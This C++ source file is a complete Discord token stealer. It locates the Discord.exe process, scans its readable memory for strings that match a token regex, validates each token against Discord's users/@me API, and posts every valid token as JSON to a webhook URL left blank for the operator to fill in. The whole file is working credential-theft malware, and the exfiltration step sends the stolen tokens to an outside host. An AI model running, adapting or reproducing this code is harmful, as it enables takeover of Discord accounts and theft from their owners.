// --- author: lil jaime ---
// the TRYHARDER experience 
#define _CRT_SECURE_NO_WARNINGS // sprintf moment

#include <iostream>
#include <Windows.h>   // winapi
#include <winternl.h>
#include <vector>      // dynamic arrays
#include <regex>       // std::regex
#include <TlHelp32.h>  // get proc snapshots & handles
#include <thread>      // multithreading
#include <atomic>      // manage matchCount
#include <mutex>       // mutual exclusion
#include <cstdio>      // format c_strings

#include <locale>
#include <codecvt>     // wide string conversion
// im the libcurl god lol
#include <curl/curl.h>
// JSON serializing
#include <nlohmann/json.hpp>
// lazy
using json = nlohmann::json;

// replace 
const char* webhook = "";
constexpr DWORD MAX_VALUE_SIZE = 1024;

// pre-compile regex pattern for discord token
std::regex filterRegex(R"([\w-]{24,26}\.[\w-]{6}\.[\w-]{34,38})");
// mutex for synchronization of the matchCount
std::mutex matchMutex;
std::vector<std::string> tokens; // final tokens


// function 2 convert wstring 2 std::string
std::string convert_wstring(const std::wstring& wstr) {
    std::wstring_convert<std::codecvt_utf8<wchar_t>> convert;
    // encode
    return convert.to_bytes(wstr);
}

int verify_token(std::string token) {
    // validate token found in memory
    CURL* curl;
    CURLcode res;

    curl = curl_easy_init();
    // check
    if (curl) {
        // create header chunk
        struct curl_slist* headers = nullptr; // initialize
        // header string
        char buff[100];
        // format
        sprintf(buff, "Authorization: %s", token.c_str());
        // build header chunk
        headers = curl_slist_append(headers, buff);
        // build request
        curl_easy_setopt(curl, CURLOPT_URL, (const char*)"https://discordapp.com/api/v9/users/@me");
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

        res = curl_easy_perform(curl);

        if (res == CURLE_OK)
            return 1;
    }
    return 0;
}

void broadcast(std::string content) {
    // send tokenz 2 webhook
    // initialize curl
    CURL* curl = curl_easy_init();
    json payload; // new json payload
    // deserialize payload
    payload["content"] = content;
    std::string str    = payload.dump();
    // header chunk
    struct curl_slist* chunk = nullptr;
    chunk = curl_slist_append(chunk, "Content-Type: application/json");
    // build http req
    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, webhook);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, str.c_str());
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, chunk);
        // perform curl
        CURLcode res = curl_easy_perform(curl);
    }
}


// memorygrabber class to handle memory scanning
class MemoryGrabber {
public:
    // constructor
    MemoryGrabber(const std::wstring& processName)
        : processName(processName), matchCount(0) {
    }

    // function to find a process by its name
    DWORD getProcessByName() {
        PROCESSENTRY32 pe32;
        // convert
        std::string narrow_str = convert_wstring(this->processName);
        // dbg
        std::cout << "[*] attempting to retrieve ID of " << narrow_str << std::endl;
        pe32.dwSize = sizeof(PROCESSENTRY32);
        // create snapshot
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        // check
        if (hSnapshot == INVALID_HANDLE_VALUE) {
            std::cerr << "[!] failed to create snapshot! [!]" << std::endl;
            return 0;
        }

        if (!Process32First(hSnapshot, &pe32)) {
            std::cerr << "[!] failed to retrieve process information [!]" << std::endl;
            CloseHandle(hSnapshot);
            return 0;
        }

        do {
            if (this->processName == pe32.szExeFile) {
                // close handle & return procID
                CloseHandle(hSnapshot);
                // dbg
                std::cout << "[*] found process id: " << pe32.th32ProcessID << std::endl;
                // return the process ID
                return pe32.th32ProcessID;
            }
        } while (Process32Next(hSnapshot, &pe32));

        CloseHandle(hSnapshot);
        return 0;
    }

    // function to read and process memory
    void processMemoryRegion(HANDLE process, BYTE* addr, SIZE_T regionSize) {
        // vectory 4 regionSize
        std::vector<char> page(regionSize);
        // read mem by chunk
        if (ReadProcessMemory(process, addr, page.data(), regionSize, nullptr)) {
            // convert memory to a string
            std::string str(page.begin(), page.end());

            // remove non-printable characters
            str.erase(std::remove_if(str.begin(), str.end(), [](unsigned char c) {
                return !std::isprint(c);  // keep only printable characters
                }), str.end());
         
            // look for all matches of the regex within the string
            std::smatch matches;
            auto begin = str.cbegin();
            while (std::regex_search(begin, str.cend(), matches, filterRegex)) {
                // only print the part of the string that matches the regex
                std::string matchStr = matches.str();
                std::lock_guard<std::mutex> lock(matchMutex);  // lock for safe access to matchCount
                // increment count by one
                matchCount++;
                // dbg
                std::cout << "[*] FOUND POTENTIAL TOKEN: " << matchStr << std::endl;
                // check vector if token was already found [sometimes multiple of the same matches are found in memory]
                auto iter = std::find(tokens.begin(), tokens.end(), matchStr);
                // check if iterable is the last value
                if (iter == tokens.end() && verify_token(matchStr)) {
                    // send token 2 server
                    broadcast(matchStr);
                    // dbg
                    std::cout << "[*] TOKEN: " << matchStr << " was validated! [*]" << std::endl;
                    // append 2 vector
                    tokens.push_back(matchStr);
                }
                // move the search start point to the end of the last match
                begin = matches[0].second;
            }
        }
    }

    // function to scan a process's memory in parallel
    void scanProcess(HANDLE process) {
        MEMORY_BASIC_INFORMATION mbi;

        // check if process is valid
        if (!process) {
            std::cerr << "failed to find the process!" << std::endl;
            return;
        }

        std::cout << "[*] scanning process memory... [*]" << std::endl;

        for (BYTE* addr = nullptr; VirtualQueryEx(process, addr, &mbi, sizeof(mbi)) == sizeof(mbi); addr += mbi.RegionSize) {
            // only read committed memory that is readable and writable (skip regions with no access, guard pages, etc.)
            if (mbi.State == MEM_COMMIT && (mbi.Protect & PAGE_READWRITE || mbi.Protect & PAGE_EXECUTE_READWRITE)) {
                // debugging                                      // type cast for output
                std::cout << "[*] scanning region at address: " << static_cast<void*>(addr) << " of size: " << mbi.RegionSize << std::endl;
                // read memory in parallel
                std::thread t(&MemoryGrabber::processMemoryRegion, this, process, addr, mbi.RegionSize);
                t.join();  // use join to ensure the main thread waits for the thread to finish
            }
        }

        std::cout << "total matches found: " << matchCount.load() << std::endl;
    }


private:
    std::wstring processName;         // process name to search
    std::atomic<int> matchCount;      // count of matching strings
};


void dumpTokens(std::vector<std::string> tokens) {
    // send all tokens in vector 2 server
    for (int i = 0; i < tokens.size(); i++) {
        // create new webhook object
        // send 2 server
        broadcast(tokens[i]);
    }
}

int main() {
    // entry point
    // name of the running process
    std::wstring processName = L"Discord.exe";
    // convert to narrow string
    // create an instance of MemoryGrabber
    MemoryGrabber* memoryGrabber = new MemoryGrabber(processName);
    // get the process id of the target process
    DWORD pid = memoryGrabber->getProcessByName();

    if (!pid) {
        std::cerr << "could not find the process!" << std::endl;
        delete memoryGrabber;
        return -1;
    }

    // open the process for memory reading
    HANDLE process = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, pid);

    if (!process) {
        std::cerr << "failed to open the process!" << std::endl;
        delete memoryGrabber;
        return -1;
    }

    // scan process memory
    memoryGrabber->scanProcess(process);
    // dump tokenzzzz
    // dumpTokens(tokens);
    // close the process handle
    CloseHandle(process);
    // clean up memory
    delete memoryGrabber;

    return 0;
}
